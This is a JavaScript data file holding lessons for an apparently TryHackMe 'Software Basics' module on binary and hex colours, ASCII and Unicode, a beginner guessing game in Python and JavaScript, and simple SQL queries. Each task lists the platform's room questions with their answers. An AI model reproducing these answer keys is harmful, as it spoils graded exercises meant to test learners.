      {icon:"🧱", title:"Software Basics", intro:"This module introduces the core building blocks behind software: data representation and encoding. You’ll learn how computers store colours, numbers, and text, and how character encoding turns letters into numeric values that systems can understand. After that, you’ll get hands-on demos in Python and JavaScript, building familiarity with key programming concepts. You’ll finish by exploring databases and learning how SQL is used to retrieve and manage stored data.", text:"Explore how computers handle data behind the scenes, and try your first steps in Python, JavaScript, and SQL.",
       rooms:[
        {name:"Data Representation", text:"Learn about how computers represent numbers and colors.",
         icon:"🎨", level:"easy", time:"45 min",
         tasks:[
          {title:"Introduction", notes:`
            <p>Are you curious to explore in-depth how computers represent colors and numbers? You are not only interested in seeing a purple color on the screen, but also interested in inspecting how this "purple" is represented in the computer memory. As a bonus, you will also learn how computers manage to do all their calculations when they can read and write only two states and interpret them as 0 and 1.</p>
            ${bitBulbSVG()}
            <p>Human beings find it most convenient to use the decimal system for everyday tasks, such as counting, measuring, weighing, and paying. If you like jogging, you might track your progress by timing yourself; for instance, you might say you jogged for 23 minutes. When you look at prices, you expect something like 17, 99, 239, 3049, and so on. Without giving it much thought, we use the <b>decimal system</b>, where the digits range from 0 to 9. Computers, on the other hand, are limited to two digits: <b>0 and 1</b>.</p>
            <h3>Learning Objectives</h3>
            <ul>
              <li>Representing 8 colors</li>
              <li>Representing 16 million colors</li>
              <li>Binary numbers</li>
              <li>Hexadecimal numbers</li>
              <li>(Optional) Octal numbers</li>
            </ul>`},

          {title:"Representing Colors", notes:`
            <h3>Our First Eight Colors</h3>
            <p>By combining different amounts of <b>red, green, and blue (RGB)</b> lights, you can get any color you like. In computer colors, think of it like three knobs, and each knob controls one of the three primary light colors.</p>
            <p>Let's say that each of the three colors can be either on or off, i.e., each has two states:</p>
            <ul>
              <li>The red light can be either on or off</li>
              <li>The green light can be either on or off</li>
              <li>The blue light can be either on or off</li>
            </ul>
            <p>These states give us <b>2 × 2 × 2 = 8</b> different colors.</p>
            ${rgbVennSVG()}
            <p>If a computer were limited to 8 colors, it would only need to indicate which color is "switched on" and which is "switched off." In fact, it can use three digits of 1 and 0 to represent the states of red, green, and blue. For example, <code>111</code> would be all 3 lights switched on, while <code>100</code> would be only the red switched on. This digit, which can be either 1 or 0, is called a <b>bit</b>.</p>
            <table>
              <tr><th>Color Representation (RGB)</th><th>Representation Meaning</th><th>Color Name</th></tr>
              <tr><td><code>000</code></td><td>All colors are off</td><td>Black</td></tr>
              <tr><td><code>001</code></td><td>Only blue is on</td><td>Blue</td></tr>
              <tr><td><code>010</code></td><td>Only green is on</td><td>Green</td></tr>
              <tr><td><code>100</code></td><td>Only red is on</td><td>Red</td></tr>
              <tr><td><code>011</code></td><td>Green and blue are on</td><td>Cyan</td></tr>
              <tr><td><code>101</code></td><td>Red and blue are on</td><td>Magenta</td></tr>
              <tr><td><code>110</code></td><td>Red and green are on</td><td>Yellow</td></tr>
              <tr><td><code>111</code></td><td>All colors are on</td><td>White</td></tr>
            </table>

            <h3>From 8 to 16,000,000 Colors</h3>
            <p>Being limited to eight colors is inconvenient, as we prefer millions of colors. It would be convenient if each of the 3 lights (red, green, and blue) had <b>256 levels</b> instead of just 2 (on or off). Let's repeat the same math as earlier: <b>256 × 256 × 256 = 16,777,216</b> colors; that covers most human visual needs.</p>
            <p>One bit is enough to represent 2 states: on and off. We need <b>8 bits</b> to express 256 states. In computing, a group of 8 bits is referred to as a <b>byte</b> (or an <b>octet</b>).</p>
            <p>Putting all this together, a color is now represented as 3 × 8 bits, or <b>3 bytes (24 bits)</b>. For example, one green color used on web pages is represented as: <code>10100011 11101010 00101010</code>. That is not very convenient to read or write, which brings us to hexadecimal representation!</p>

            <h3>Hexadecimal Representation</h3>
            <p>Hexadecimal representation makes it easy to combine 4 bits into a single character (a hex digit). Since each hex digit represents 4 bits, two hex digits represent an entire byte (8 bits).</p>
            <table>
              <tr><th>Hex Digit</th><th>Binary Representation</th><th>Hex Digit</th><th>Binary Representation</th></tr>
              <tr><td><code>0</code></td><td><code>0000</code></td><td><code>8</code></td><td><code>1000</code></td></tr>
              <tr><td><code>1</code></td><td><code>0001</code></td><td><code>9</code></td><td><code>1001</code></td></tr>
              <tr><td><code>2</code></td><td><code>0010</code></td><td><code>A</code> (10)</td><td><code>1010</code></td></tr>
              <tr><td><code>3</code></td><td><code>0011</code></td><td><code>B</code> (11)</td><td><code>1011</code></td></tr>
              <tr><td><code>4</code></td><td><code>0100</code></td><td><code>C</code> (12)</td><td><code>1100</code></td></tr>
              <tr><td><code>5</code></td><td><code>0101</code></td><td><code>D</code> (13)</td><td><code>1101</code></td></tr>
              <tr><td><code>6</code></td><td><code>0110</code></td><td><code>E</code> (14)</td><td><code>1110</code></td></tr>
              <tr><td><code>7</code></td><td><code>0111</code></td><td><code>F</code> (15)</td><td><code>1111</code></td></tr>
            </table>
            <p>Going back to the green color: instead of typing <code>10100011 11101010 00101010</code>, we can write <code>#A3EA2A</code>. That is how colors are specified in HTML, CSS, and graphic design software!</p>
            <ul>
              <li>In real-life applications, a 24-bit TrueColor image assigns 1 byte per primary color: Red (RR), Green (GG), Blue (BB).</li>
              <li>Every 4 bits are represented by one hexadecimal digit.</li>
              <li>Each byte (8 bits, 0–255) is represented by two hexadecimal digits (<code>00</code> to <code>FF</code>).</li>
            </ul>

            <p><b>Room questions covered:</b></p>
            <ul>
              <li><i>Preview the color <code>#38C81E</code>. In one word, what does this color appear to be?</i> <b>green</b></li>
              <li><i>What is the binary representation of the color <code>#EB0037</code>?</i> <b>11101011 00000000 00110111</b></li>
              <li><i>What is the decimal representation of the color <code>#D4D8DF</code>?</i> <b>212 216 223</b></li>
            </ul>`},

          {title:"Numbers: From Decimal to Hexadecimal", notes:`
            <p>Human beings have ten fingers, and this is the most plausible explanation for why we use the decimal (base-10) system in everyday life. Computers, on the other hand, have physical components that represent two states:</p>
            <ul>
              <li><b>Low and High voltage:</b> transistor-transistor logic (low range 0–0.8V = 0, high range 2.0–5.0V = 1).</li>
              <li><b>North and South magnetic polarity:</b> mechanical hard disk drives.</li>
              <li><b>Light pulse presence or absence:</b> fiber optics.</li>
            </ul>
            <p>In decimal, a number such as <code>213</code> means 2 × 10² + 1 × 10¹ + 3 × 10⁰ = 200 + 10 + 3.</p>

            <h3>Binary Numbers (Base-2)</h3>
            <p>The binary system can be expressed similarly, with powers of 2. For example, the binary number <code>1001</code> can be converted to decimal:</p>
            <pre><code>1001 = 1 × 2³ + 0 × 2² + 0 × 2¹ + 1 × 2⁰ = 8 + 0 + 0 + 1 = 9</code></pre>
            <p>Converting 4-bit numbers (nibbles):</p>
            <ul>
              <li><code>0000</code> = 0</li>
              <li><code>0001</code> = 1</li>
              <li><code>0010</code> = 2</li>
              <li><code>0011</code> = 3</li>
              <li><code>0100</code> = 4</li>
              <li><code>1100</code> = 8 + 4 = 12 (Hex C)</li>
              <li><code>1111</code> = 8 + 4 + 2 + 1 = 15 (Hex F)</li>
            </ul>

            <h3>Converting From Hexadecimal to Decimal</h3>
            <p>Each hex position represents a power of 16 (16⁰ = 1, 16¹ = 16, 16² = 256, 16³ = 4096):</p>
            <pre><code>9BDF₁₆ = 9 × 16³ + 11 × 16² + 13 × 16¹ + 15 × 16⁰
       = 9 × 4096 + 11 × 256 + 13 × 16 + 15 × 1
       = 36864 + 2816 + 208 + 15 = 39,903</code></pre>

            <h3>Optional: Octal Numbers (Base-8)</h3>
            <p>The octal system uses digits <b>0 to 7</b>. While hexadecimal groups 4 bits, octal groups <b>3 bits</b>:</p>
            <pre><code>357₈ = 3 × 8² + 5 × 8¹ + 7 × 8⁰ = 3 × 64 + 5 × 8 + 7 × 1 = 192 + 40 + 7 = 239</code></pre>

            <p><b>Room questions covered:</b></p>
            <ul>
              <li><i>What is the hexadecimal <code>FF</code> in binary?</i> <b>11111111</b></li>
              <li><i>What is the hexadecimal <code>AB</code> in decimal?</i> <b>171</b></li>
              <li><i>Convert the hexadecimal <code>FF FF FF</code> to decimal. After you round up the decimal value to the nearest million, how many millions is that?</i> <b>17</b> (16,777,215 rounds up to 17 million)</li>
            </ul>`},

          {title:"Conclusion", notes:`
            <p>In this room, we covered several core topics related to how numeric values and colors are represented and stored in computer memory:</p>
            <ul>
              <li><b>Decimal (Base-10):</b> digits 0–9 used by humans.</li>
              <li><b>Binary (Base-2):</b> digits 0 and 1 representing physical electronic states.</li>
              <li><b>Hexadecimal (Base-16):</b> digits 0–9 and A–F, where each digit groups 4 bits (nibble).</li>
              <li><b>Octal (Base-8):</b> digits 0–7, where each digit groups 3 bits.</li>
              <li><b>Bit &amp; Byte:</b> a bit is 0 or 1; a byte (octet) is 8 bits (256 distinct values).</li>
              <li><b>Hex Color:</b> 24-bit TrueColor encodes RGB with 3 bytes (e.g. <code>#FF0000</code> for pure red), producing over 16.7 million colors.</li>
            </ul>`}
         ]},

        {name:"Data Encoding", text:"Learn how computer encodes characters, from ASCII to Unicode's UTF.",
         icon:"🔤", level:"easy", time:"45 min",
         tasks:[
          {title:"Introduction", notes:`
            <p>In the previous room, you learned how numbers and colors are stored in memory as binary digits. But how do we store and display text, punctuation, and emojis?</p>
            <p>Characters are stored in computers as numbers with agreed meanings. That agreed mapping is called an <b>encoding</b>. Have you ever opened a document, visited a webpage, or downloaded subtitle files only to see weird gibberish characters (like <code>Ø§Ù„Ø¯ÙŠÙˆØ§Ù†</code>)? That occurs when the program saving the file and the program displaying it use different, incompatible encodings!</p>
            <p><b>Representation vs Encoding:</b> Representation is the idea that data lives as bits and numbers in memory. Encoding is the specific, agreed-upon mapping between numbers and meanings (e.g. which number represents the character "A").</p>
            <h3>Learning Objectives</h3>
            <ul>
              <li>ASCII character set</li>
              <li>Unicode standard</li>
              <li>UTF-8, UTF-16, and UTF-32</li>
              <li>How emojis are encoded</li>
              <li>Understanding mojibake (gibberish characters)</li>
            </ul>`},

          {title:"ASCII", notes:`
            <p><b>ASCII</b> stands for <i>American Standard Code for Information Interchange</i> (created in 1963). It is an early character encoding that uses numbers <b>0 to 127</b> (7 bits) to represent English letters, digits, punctuation, and system control codes.</p>
            <table>
              <tr><th>Decimal</th><th>Hex</th><th>Binary</th><th>Character</th><th>Description</th></tr>
              <tr><td><code>0–31</code></td><td><code>00–1F</code></td><td>—</td><td>Control chars</td><td>NUL, BEL (7), BS, TAB, LF (10), CR (13)</td></tr>
              <tr><td><code>32</code></td><td><code>20</code></td><td><code>00100000</code></td><td>[Space]</td><td>Space character</td></tr>
              <tr><td><code>35</code></td><td><code>23</code></td><td><code>00100011</code></td><td><code>#</code></td><td>Number sign / Hash</td></tr>
              <tr><td><code>48–57</code></td><td><code>30–39</code></td><td><code>00110000–00111001</code></td><td><code>0 – 9</code></td><td>Numeric digits</td></tr>
              <tr><td><code>64</code></td><td><code>40</code></td><td><code>01000000</code></td><td><code>@</code></td><td>At sign</td></tr>
              <tr><td><code>65–90</code></td><td><code>41–5A</code></td><td><code>01000001–01011010</code></td><td><code>A – Z</code></td><td>Uppercase English letters</td></tr>
              <tr><td><code>97–122</code></td><td><code>61–7A</code></td><td><code>01100001–01111010</code></td><td><code>a – z</code></td><td>Lowercase English letters</td></tr>
              <tr><td><code>127</code></td><td><code>7F</code></td><td><code>01111111</code></td><td>DEL</td><td>Delete control code</td></tr>
            </table>

            <h3>"TryHackMe" in ASCII</h3>
            <p>Writing "TryHackMe\\n" into a file produces this exact byte stream:</p>
            <pre><code>Text:    T   r   y   H   a   c   k   M   e  \\n
Hex:    54  72  79  48  61  63  6b  4d  65  0a
Dec:    84 114 121  72  97  99 107  77 101  10</code></pre>

            <h3>Extended ASCII &amp; European Codepages</h3>
            <p>ASCII only uses 7 bits. Using the 8th bit allowed 128 additional characters (128–255), creating the ISO/IEC 8859 series:</p>
            <ul>
              <li><b>ISO-8859-1 (Latin-1):</b> Western European languages (French, Spanish, German: <code>é</code>, <code>ñ</code>, <code>ü</code>, <code>ß</code>).</li>
              <li><b>ISO-8859-2 (Latin-2):</b> Central/Eastern European languages (Polish, Czech, Hungarian: <code>ł</code>, <code>ń</code>, <code>č</code>, <code>ő</code>).</li>
            </ul>
            <p class="callout"><b>The Flaw:</b> When an ISO-8859-1 document is opened in an ISO-8859-2 reader, the text becomes corrupt because the same byte value points to completely different letters in each standard.</p>

            <p><b>Room questions covered:</b></p>
            <ul>
              <li><i>What is the ASCII code in decimal for the character @ ?</i> <b>64</b></li>
              <li><i>What is the character that has the ASCII code of 35 in decimal?</i> <b>#</b></li>
              <li><i>What is the name of the character that has the ASCII code of 7?</i> <b>BEL</b> (Bell)</li>
            </ul>`},

          {title:"Unicode", notes:`
            <p>With languages around the globe (e.g. Chinese with over 87,000 Hanzi characters, Japanese JIS with thousands of Kanji, Arabic ligatures), 8 bits were never enough. This gave birth to <b>Unicode</b>.</p>
            <p>Unicode is a universal character encoding standard that assigns a unique number called a <b>code point</b> (written as <code>U+XXXX</code>) to every character across all human languages, scripts, mathematical symbols, chess pieces, and emojis. Unicode 17.0 defines nearly <b>157,000 characters</b> and around <b>4,000 emojis</b>!</p>
            <ul>
              <li><code>U+0041</code>: Latin letter "A"</li>
              <li><code>U+03A9</code>: Greek letter "Ω"</li>
              <li><code>U+3042</code>: Japanese Hiragana "あ"</li>
              <li><code>U+2615</code>: Hot Beverage symbol (☕)</li>
              <li><code>U+2658</code>: White Chess Knight (♘)</li>
              <li><code>U+265E</code>: Black Chess Knight (♞)</li>
              <li><code>U+1F525</code>: Fire emoji (🔥)</li>
            </ul>

            <h3>UTF-8, UTF-16, and UTF-32</h3>
            <p>Unicode code points are encoded into bytes through three standard transformations:</p>
            ${utfComparisonSVG()}
            <ul>
              <li><b>UTF-8:</b> Variable length (1 to 4 bytes). Fully backwards-compatible with ASCII (ASCII characters take exactly 1 byte). Most popular format on the web today.</li>
              <li><b>UTF-16:</b> Variable length (2 or 4 bytes). Used internally by Windows, Java, and JavaScript. Common characters take 2 bytes; rarer characters and emojis use surrogate pairs (4 bytes).</li>
              <li><b>UTF-32:</b> Fixed 4 bytes per character. Very simple to index in memory, but wastes excessive space (a plain ASCII text file becomes 4x larger).</li>
            </ul>

            <p><b>Room questions covered:</b></p>
            <ul>
              <li><i>What is the UTF-32 encoding of 🤓 ?</i> <b>U+0001F913</b></li>
              <li><i>What is the UTF-16 encoding of シ? Note that ツ and シ are two different characters.</i> <b>U+30B7</b></li>
              <li><i>What is the character that has the following UTF-16 encoding U+2615 ?</i> <b>☕</b></li>
              <li><i>What is the character that has the following UTF-16 encoding U+2658 ?</i> <b>♘</b></li>
            </ul>`},

          {title:"Conclusion", notes:`
            <p>In this room, we learned about the history and mechanisms of character encoding:</p>
            <ul>
              <li><b>ASCII:</b> 7-bit standard (0–127) for English characters and basic punctuation.</li>
              <li><b>Codepage fragmentation:</b> regional 8-bit standards (ISO-8859-1/2) that conflicted with each other.</li>
              <li><b>Unicode:</b> the unified global standard assigning unique <code>U+XXXX</code> code points to all characters and emojis.</li>
              <li><b>UTF-8 dominance:</b> variable 1–4 byte encoding that keeps ASCII compact while supporting all global scripts.</li>
            </ul>`}
         ]},

        {name:"Python: Simple Demo", text:"Explore what a basic Python program looks like.",
         icon:"🐍", level:"easy", time:"60 min", premium:true,
         tasks:[
          {title:"Introduction", notes:`
            <p>Python is a high-level, general-purpose programming language. By <i>high-level</i>, we mean it hides low-level hardware implementation details (like manual memory management); <i>general-purpose</i> means you can use Python for web development, automation scripts, penetration testing tools, data science, and machine learning.</p>
            <p>In this room, we will build a <b>"Guess the Number"</b> game:</p>
            <ol>
              <li>The computer secretly picks a number between 1 and 20.</li>
              <li>The user keeps guessing until they get it right.</li>
              <li>The computer tells the user whether their guess is too low or too high.</li>
            </ol>
            <pre><code>ubuntu@tryhackme:~$ python guess_the_number.py
I'm thinking of a number between 1 and 20
Take a guess: 10
Too high, try again.
Take a guess: 5
Too low, try again.
Take a guess: 7
Too low, try again.
Take a guess: 8
You got it in 4 tries!</code></pre>
            <h3>Learning Objectives</h3>
            <ul>
              <li>Learn about Python variables</li>
              <li>Understand how conditional statements (<code>if</code> / <code>elif</code> / <code>else</code>) work</li>
              <li>See iteration loops (<code>while</code>) in action</li>
            </ul>`},

          {title:"Variables", lab:true, notes:`
            <p>A variable is a named storage location in memory that holds a value. In our game we need three variables:</p>
            <ul>
              <li><code>secret</code>: the random number chosen by the computer (between 1 and 20).</li>
              <li><code>guess</code>: the number entered by the user.</li>
              <li><code>tries</code>: a counter tracking how many guesses the player has made.</li>
            </ul>
            <h3>The Incomplete Draft (<code>guess_v1.py</code>)</h3>
            <pre><code>import random  # gives us tools for picking random numbers

secret = random.randint(1, 20)  # a &lt;= secret &lt;= b
tries = 0
guess = 0  # start with a value outside the valid range

print("I'm thinking of a number between 1 and 20")

text = input("Take a guess: ")  # input() returns text (a string)
guess = int(text)  # convert the text to a number

tries = tries + 1  # add 1 try</code></pre>
            <p>Key Python concepts used here:</p>
            <ul>
              <li><code>random.randint(1, 20)</code>: returns a random integer between 1 and 20 inclusive.</li>
              <li><code>print(...)</code>: displays text on the terminal screen.</li>
              <li><code>input(...)</code>: pauses execution and waits for the user to type input and press Enter (returns a string).</li>
              <li><code>int(...)</code>: converts the string to an integer so mathematical comparisons can be performed.</li>
            </ul>

            <p><b>Room questions covered:</b></p>
            <ul>
              <li><i>What is the name of the function we used to display text on the screen?</i> <b>print</b></li>
              <li><i>What is the name of the function that we used to convert user input to an integer?</i> <b>int</b></li>
            </ul>`},

          {title:"Conditional Statements", lab:true, notes:`
            <p>In <code>guess_v1.py</code>, the computer read the user's guess but gave no feedback. To compare the guess with the secret, we use conditional statements.</p>
            <h3>Branching Logic</h3>
            <pre><code># Give a hint using if / elif / else.
if guess &lt; 1 or guess &gt; 20:
    print("That number is out of range. Try again.")
elif guess &lt; secret:
    print("Too low, try again.")
elif guess &gt; secret:
    print("Too high, try again.")
else:
    print("You got it in", tries, "tries!")</code></pre>
            <p>How Python evaluates this:</p>
            <ul>
              <li><code>if</code> evaluates the first condition. If true, its indented block runs and the rest of the chain is skipped.</li>
              <li><code>elif</code> (short for "else if") tests an alternative condition only if all preceding conditions evaluated to <code>False</code>.</li>
              <li><code>else</code> runs only when all previous conditions failed, meaning <code>guess == secret</code>.</li>
              <li>Logical operator <code>or</code> checks if either condition is true.</li>
            </ul>
            <p><b>Numerical example:</b> If <code>secret = 10</code> and the user enters <code>50</code>, the first condition <code>guess &gt; 20</code> is true, printing: <i>"That number is out of range. Try again."</i></p>

            <p><b>Room questions covered:</b></p>
            <ul>
              <li><i>How does Python write "else if"?</i> <b>elif</b></li>
              <li><i>What will the program display if the user's input is 50?</i> <b>That number is out of range. Try again.</b></li>
            </ul>`},

          {title:"Iterations", lab:true, notes:`
            <p>In <code>guess_v2.py</code>, the user only had one chance to guess. To allow multiple attempts until the player guesses correctly, we use a loop.</p>
            <h3>The <code>while</code> Loop</h3>
            <p>A <code>while</code> loop repeatedly executes an indented block of code as long as its condition remains <code>True</code>:</p>
            <pre><code>while guess != secret:
    # repeat prompt, input conversion, tries increment, and hints</code></pre>
            <p>In Python, <code>!=</code> means <b>not equal to</b>.</p>
            <h3>Complete Program (<code>guess_v3.py</code>)</h3>
            <pre><code>import random

# -----------------------------
# Guess the Number (Beginner Demo)
# -----------------------------
# The computer picks a secret number.
# The player keeps guessing until they find it.

secret = random.randint(1, 20)
tries = 0
guess = 0

print("I'm thinking of a number between 1 and 20")

while guess != secret:
    text = input("Take a guess: ")
    guess = int(text)
    tries = tries + 1

    if guess &lt; 1 or guess &gt; 20:
        print("That number is out of range. Try again.")
    elif guess &lt; secret:
        print("Too low, try again.")
    elif guess &gt; secret:
        print("Too high, try again.")
    else:
        print("You got it in", tries, "tries!")</code></pre>

            <p><b>Room questions covered:</b></p>
            <ul>
              <li><i>What type of loop does this program use?</i> <b>while</b></li>
              <li><i>What will the program display if the user makes the correct guess in 3 tries?</i> <b>You got it in 3 tries!</b></li>
            </ul>`},

          {title:"Conclusion", notes:`
            <p>In this room, we covered the three core pillars of imperative programming in Python:</p>
            <ul>
              <li><b>Variables:</b> storing and naming data in memory.</li>
              <li><b>Conditionals:</b> branching logic using <code>if</code>, <code>elif</code>, and <code>else</code>.</li>
              <li><b>Loops:</b> repetition of instructions using <code>while</code> until a termination condition is reached.</li>
            </ul>`}
         ]},

        {name:"JavaScript: Simple Demo", text:"Explore what a basic JavaScript program looks like.",
         icon:"📜", level:"easy", time:"60 min", premium:true,
         tasks:[
          {title:"Introduction", notes:`
            <p>JavaScript is one of the most widely used programming languages in the world. Originally created to run in web browsers for client-side interactivity, JavaScript now powers massive backend server systems through <b>Node.js</b>.</p>
            <p>In this room, we will build the exact same "Guess the Number" game in JavaScript. Comparing both rooms offers a great perspective on how modern programming languages differ in syntax while sharing identical foundational logic.</p>
            <pre><code>ubuntu@tryhackme:~/JavaScript-Demo$ node guess_v3.js
I'm thinking of a number between 1 and 20
Take a guess: 10
Too high, try again.
Take a guess: 5
Too low, try again.
Take a guess: 7
You got it in 3 tries!</code></pre>`},

          {title:"Variables", notes:`
            <p>In modern JavaScript, variables and constants are declared explicitly with keywords:</p>
            <ul>
              <li><code>let</code>: declares a re-assignable variable whose value can change during execution.</li>
              <li><code>const</code>: declares a constant whose value cannot be re-assigned after initialization.</li>
            </ul>
            <pre><code>let tries = 0;
let guess = 0;
const secret = Math.floor(Math.random() * 20) + 1;</code></pre>

            <h3>How Random Numbers Work in JavaScript</h3>
            <ul>
              <li><code>Math.random()</code>: returns a pseudo-random decimal number in the range <code>[0, 1)</code> (e.g. <code>0.372</code>).</li>
              <li><code>* 20</code>: scales the range to <code>[0, 20)</code> (e.g. <code>7.44</code>).</li>
              <li><code>Math.floor(...)</code>: rounds down to the nearest integer, giving <code>0..19</code>.</li>
              <li><code>+ 1</code>: shifts the range from <code>0..19</code> to <code>1..20</code>.</li>
            </ul>
            <p>To print output to the terminal or console, JavaScript uses <code>console.log()</code>:</p>
            <pre><code>console.log("I'm thinking of a number between 1 and 20");</code></pre>

            <p><b>Room questions covered:</b></p>
            <ul>
              <li><i>What word is used to declare a variable?</i> <b>let</b></li>
              <li><i>What word is used to declare a constant?</i> <b>const</b></li>
              <li><i>What is the method that we call to display text on the screen?</i> <b>console.log</b></li>
            </ul>`},

          {title:"Prompting the User for Input", lab:true, notes:`
            <p>In Node.js, reading user input from the terminal uses the built-in <code>readline</code> module. Using ES modules and async/await:</p>
            <pre><code>import * as readline from "node:readline/promises";
import { stdin as input, stdout as output } from "node:process";

const rl = readline.createInterface({ input, output });

try {
  const secret = Math.floor(Math.random() * 20) + 1;
  let tries = 0;
  let guess = 0;

  console.log("I'm thinking of a number between 1 and 20");

  const text = await rl.question("Take a guess: ");
  guess = parseInt(text, 10);  // convert text string into base-10 integer

  tries = tries + 1;
} finally {
  rl.close();
}</code></pre>
            <p><code>parseInt(text, 10)</code> parses a string argument and returns an integer of the specified radix (base 10).</p>

            <p><b>Room question covered:</b></p>
            <ul>
              <li><i>What method is used to convert user input into a number?</i> <b>parseInt</b></li>
            </ul>`},

          {title:"Conditional Statements", lab:true, notes:`
            <p>JavaScript uses parentheses <code>( )</code> for conditional expressions and curly braces <code>{ }</code> for code blocks:</p>
            <pre><code>// Give a hint using if / else if / else.
if (guess &lt; 1 || guess &gt; 20) {
  console.log("That number is out of range. Try again.");
} else if (guess &lt; secret) {
  console.log("Too low, try again.");
} else if (guess &gt; secret) {
  console.log("Too high, try again.");
} else {
  console.log("You got it in", tries, "tries!");
}</code></pre>
            <ul>
              <li>Logical OR is written as <code>||</code>.</li>
              <li><code>else if</code> is written as two separate words (unlike Python's <code>elif</code>).</li>
            </ul>

            <p><b>Room questions covered:</b></p>
            <ul>
              <li><i>The secret is 10. What will our program display on the screen if the user makes a guess of 15?</i> <b>Too high, try again.</b></li>
              <li><i>The secret is 10. What will our program display on the screen if the user makes a guess of 35?</i> <b>That number is out of range. Try again.</b></li>
            </ul>`},

          {title:"Iterations", lab:true, notes:`
            <p>To keep prompting until the correct secret is guessed, we wrap the question and hint blocks inside a <code>while</code> loop:</p>
            <pre><code>while (guess !== secret) {
  const text = await rl.question("Take a guess: ");
  guess = parseInt(text, 10);
  tries = tries + 1;

  if (guess &lt; 1 || guess &gt; 20) {
    console.log("That number is out of range. Try again.");
  } else if (guess &lt; secret) {
    console.log("Too low, try again.");
  } else if (guess &gt; secret) {
    console.log("Too high, try again.");
  } else {
    console.log("You got it in", tries, "tries!");
  }
}</code></pre>
            <p>In JavaScript, <code>!==</code> is the <b>strict inequality operator</b> (checks both value and type, preventing unwanted type coercion).</p>

            <p><b>Room questions covered:</b></p>
            <ul>
              <li><i>What is the name of the loop that we used in this task?</i> <b>while</b></li>
              <li><i>What is the name of the variable that is incremented by one when the user makes a new wrong guess?</i> <b>tries</b></li>
              <li><i>How is "not equal" written in JavaScript?</i> <b>!==</b></li>
            </ul>`},

          {title:"Conclusion", notes:`
            <p>In this room, we constructed a complete Node.js application demonstrating:</p>
            <ul>
              <li>Variable declarations using <code>let</code> and <code>const</code>.</li>
              <li>Console output with <code>console.log()</code> and number conversion with <code>parseInt()</code>.</li>
              <li>Control flow branching with <code>if</code>, <code>else if</code>, and <code>else</code>.</li>
              <li>Repeating code with <code>while (condition)</code> and strict comparison <code>!==</code>.</li>
            </ul>`}
         ]},

        {name:"Database SQL Basics", text:"Learn the basics of databases and SQL by writing simple queries to retrieve and manage data.",
         icon:"🗄️", level:"easy", time:"30 min", premium:true,
         tasks:[
          {title:"Introduction", notes:`
            <p>How can a café keep track of every order and still quickly answer questions about them later? If an order is written on paper notebooks, flipping through pages becomes slow and error-prone as the business grows. What happens when the computer turns off? In-memory variables vanish, but a <b>database</b> stores information persistently on disk in a structured format that is fast to search, update, and manage.</p>
            <h3>Learning Objectives</h3>
            <ul>
              <li>Understand what data is and why persistent storage matters</li>
              <li>Explain what a database is and how it is used</li>
              <li>Understand what SQL is and why it is used</li>
              <li>Identify tables, rows, and columns</li>
              <li>Write simple SQL queries to retrieve information</li>
            </ul>`},

          {title:"Understanding Tables, Rows, and Columns", notes:`
            <p>Inside a database, information is organized neatly into <b>tables</b> (similar to sheets in a spreadsheet):</p>
            ${sqlTableSVG()}
            <ul>
              <li><b>Table:</b> A named collection of related data (e.g. <code>Orders</code>, <code>Menu</code>, <code>Users</code>).</li>
              <li><b>Column (Field / Attribute):</b> Vertical categories defining a single type of information (e.g. <code>id</code>, <code>drink</code>, <code>price</code>, <code>time</code>).</li>
              <li><b>Row (Record):</b> A horizontal entry representing one complete order or entity.</li>
            </ul>
            <h3>Asking Questions with SQL</h3>
            <p><b>SQL (Structured Query Language)</b> is the universal language used to ask questions (called <b>queries</b>) of a relational database. Instead of manually inspecting rows, SQL allows us to filter, aggregate, and sort records instantly.</p>

            <p><b>Room question covered:</b></p>
            <ul>
              <li><i>Inside databases, what is the term for the "spreadsheets" that store the information?</i> <b>tables</b></li>
            </ul>`},

          {title:"Writing Your First SQL Query", lab:true, notes:`
            <p>In the attached interactive Café SQL lab, you practice writing queries against two tables: <code>Orders (id, drink, price, time)</code> and <code>Menu (drink, price)</code>.</p>

            <h3>1. View Everything (<code>SELECT</code> + <code>FROM</code>)</h3>
            <pre><code>SELECT * FROM Orders;</code></pre>
            <p>The asterisk <code>*</code> is a wildcard meaning "all columns". Running this query retrieves all 50 recorded café orders.</p>

            <h3>2. Show Only Specific Columns</h3>
            <p>Instead of requesting all columns, list only the ones you need:</p>
            <pre><code>SELECT drink, price FROM Orders;</code></pre>

            <h3>3. Filter Results with <code>WHERE</code></h3>
            <p>The <code>WHERE</code> clause keeps only rows that match a specific condition:</p>
            <pre><code>SELECT * FROM Orders WHERE drink = 'Coffee';</code></pre>

            <h3>4. Sort Results with <code>ORDER BY</code></h3>
            <p>By default, <code>ORDER BY</code> sorts ascending (cheapest / lowest first):</p>
            <pre><code>SELECT * FROM Orders ORDER BY price;</code></pre>
            <p>Sorting orders by price shows <b>Tea ($1.80)</b> as the cheapest drink appearing first.</p>
            <p>To sort in descending order (highest / most expensive first), add <code>DESC</code>:</p>
            <pre><code>SELECT * FROM Menu ORDER BY price DESC;</code></pre>
            <p>Sorting the menu by price in descending order reveals <b>Latte ($3.10)</b> appearing first.</p>

            <h3>5. Combine Filtering + Sorting</h3>
            <p>Clauses can be combined to form powerful queries:</p>
            <pre><code>SELECT * FROM Orders WHERE drink = 'Coffee' ORDER BY price DESC;</code></pre>

            <p><b>Room questions covered:</b></p>
            <ul>
              <li><i>When you showed all orders, how many rows were returned?</i> <b>50</b></li>
              <li><i>When you sorted orders by price from cheapest to most expensive, which drink appeared first?</i> <b>Tea</b></li>
              <li><i>When you sorted the menu by price from most expensive to cheapest, which drink appeared first?</i> <b>Latte</b></li>
            </ul>`},

          {title:"Conclusion", notes:`
            <p>In this room, we explored how relational databases organize information into tables, rows, and columns, and how SQL queries retrieve exactly what we need:</p>
            <table>
              <tr><th>SQL Keyword</th><th>Clause Function</th></tr>
              <tr><td><code>SELECT</code></td><td>Chooses which columns to display (or <code>*</code> for all).</td></tr>
              <tr><td><code>FROM</code></td><td>Specifies the source table.</td></tr>
              <tr><td><code>WHERE</code></td><td>Filters rows based on conditions.</td></tr>
              <tr><td><code>ORDER BY</code></td><td>Sorts output ascending (default) or descending (<code>DESC</code>).</td></tr>
            </table>
            <p class="callout"><b>Security Question to Consider:</b> What could happen if an unauthorized person could modify or delete orders without permission? In later modules, you will explore database authorization and SQL Injection vulnerabilities!</p>`}
         ]}
       ]},
